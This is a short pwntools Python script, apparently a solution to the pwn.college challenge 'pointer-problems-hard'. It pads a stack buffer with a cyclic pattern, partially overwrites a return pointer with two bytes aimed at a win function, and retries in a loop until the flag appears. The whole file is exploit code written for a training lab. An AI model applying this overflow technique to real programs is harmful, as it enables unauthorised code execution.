#!/usr/bin/python3

from pwn import *
import time

context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/pointer-problems-hard')

rbp_addr = 0x7fff89c12480
input_start  = rbp_addr - 0x60
input_end = (rbp_addr - 0x10)
overflow_size = input_end - input_start
win_add = b"\x40\xe0"

while 1:
    io = process()

    payload = cyclic(overflow_size) + win_add

    io.sendline(str(len(payload)).encode())

    time.sleep(1)

    io.send(payload)

    data = io.recvall()

    if b"pwn.college" in  data:
        print(data.decode())
        break

    io.close()
